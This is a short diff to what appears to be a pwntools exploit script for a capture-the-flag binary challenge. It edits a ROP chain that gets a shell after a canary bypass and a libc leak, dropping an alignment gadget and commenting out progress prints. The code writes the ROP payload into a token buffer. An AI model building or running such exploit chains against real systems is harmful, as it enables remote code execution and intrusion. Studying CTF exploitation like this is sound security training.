@@ -163,9 +163,6 @@ def rop_libc_base(canary, base):
 def rop_shell(canary, base, libc_base):
     p = ''
 
-    ret = base + 0x906
-    p += p64(ret)
-
     pop_rdi = base + 0x11a3
     p += p64(pop_rdi)
 
@@ -186,14 +183,14 @@ def write_token(p):
     r.sendline('2')
     r.recvuntil('token: ')
     r.sendline('\x00' * 0xb8)
-    print('finished clearing token')
+    # print('finished clearing token')
 
     # write the ROP of leaking libc in token
     r.recvuntil('>')
     r.sendline('2')
     r.recvuntil('token: ')
     r.sendline(p)
-    print('finished writing payload token')
+    # print('finished writing payload token')
 
 def vote_to_max():
     # vote for writing more buffer
